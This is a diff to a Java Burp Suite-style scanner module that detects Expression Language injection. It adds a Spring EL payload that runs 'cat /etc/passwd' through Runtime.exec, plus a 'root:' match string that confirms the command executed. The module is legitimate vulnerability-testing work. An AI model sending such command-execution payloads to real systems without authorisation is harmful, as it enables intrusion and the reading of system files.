@@ -56,21 +56,24 @@ public class ELInjection implements IModule {
         // Execute a basic algorithm operation to detect OGNL code execution
         int MAX_RANDOM_INT = 500;
         Random rand = new Random();
-        int firstInt = rand.nextInt(MAX_RANDOM_INT) + 1;
-        int secondInt = rand.nextInt(MAX_RANDOM_INT) + 1;
+        int firstInt = rand.nextInt(MAX_RANDOM_INT) + 2;
+        int secondInt = rand.nextInt(MAX_RANDOM_INT) + 2;
         String multiplication = Integer.toString(firstInt * secondInt);
 
         List<byte[]> EL_INJECTION_TESTS = Arrays.asList(
                 "${applicationScope}".getBytes(),
                 "#{applicationScope}".getBytes(),
                 String.format("${%d*%d}", firstInt, secondInt).getBytes(),
-                String.format("#{%d*%d}", firstInt, secondInt).getBytes()
+                String.format("#{%d*%d}", firstInt, secondInt).getBytes(),
+                // To detect Sring EL eval <spring:eval expression="${param.msg}" />
+                "(new+java.util.Scanner((T(java.lang.Runtime).getRuntime().exec(\"cat+/etc/passwd\").getInputStream()),\"UTF-8\")).useDelimiter(\"\\\\A\").next()".getBytes()
         );
 
         List<byte[]> GREP_STRINGS;
         GREP_STRINGS = Arrays.asList(
                 "javax.servlet.context".getBytes(),
-                multiplication.getBytes()
+                multiplication.getBytes(),
+                "root:".getBytes()
         );
 
         IExtensionHelpers helpers = callbacks.getHelpers();
